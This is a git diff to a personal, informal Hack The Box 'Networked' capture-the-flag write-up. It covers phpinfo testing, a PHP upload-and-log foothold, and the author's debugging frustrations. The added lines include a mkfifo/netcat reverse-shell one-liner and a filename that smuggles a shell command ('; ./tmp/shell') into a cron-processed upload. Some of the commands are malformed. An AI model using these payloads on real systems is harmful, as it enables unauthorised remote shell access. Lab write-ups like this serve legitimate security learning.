@@ -192,8 +192,6 @@ Phpinfo is great for testnig php related vulnerabilities
 ![](phpinfoisbetterfortesting.png)
 
 
-
-
 ## Foothold
 
 Massive overthinking lesson and not trusting original approach, which was valid 
@@ -246,6 +244,44 @@ Inifinite lock to prevent log file being remove.
 	1. Filename must be not contain dots - listening on localhost?
 	2. Or quotes `'`?s
 
-It connects, but breaks - then a shell without a extension
+It connects, but breaks if you use `nc -nv` - then a shell without a extension
 ![](works.png)
 
+The final condition will always run as:
+![](codebroke.png)
+As if not false is actually false + false
+![](alwaywillrun.png)
+
+Check_ip()
+![](chkip.png)
+
+Unlike `with x as f:` in python, but like go, c or rust requires close() method to the file so it will never close.
+![](flockyou.png)
+
+To refresh:
+1. Create an attack.log file in /tmp
+1. create a file in uploads
+	1. Filename must be not contain dots - listening on localhost?
+	2. Or quotes `'`?s
+3. we need a second shell to execute the exploitation 
+
+```bash
+touch rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc localhost 8089 >/tmp/h'
+# remember attack.log is php
+touch system
+```
+
+![](cantappend.png)
+Vim worked so just added a shell there. It did not put my test file name as a message in the attack.log though, waited, test.test.test was gone
+
+![](3minutesisalongtime.png)
+Reviewing [snowscan](https://snowscan.io/htb-writeup-networked) I had intially the write idea, but he is injecting the later lines. Once a again I am focusing on the wrong thing like self executing filenames. Where the solution is simply:
+
+```bash
+touch 'var/www/html/uploads/; ./tmp/shell'
+# would not let create that
+```
+
+![](eh.png)
+
+Reset the box as I think it is broken. AAAAAAAAAAAAAAAAAAARGH!
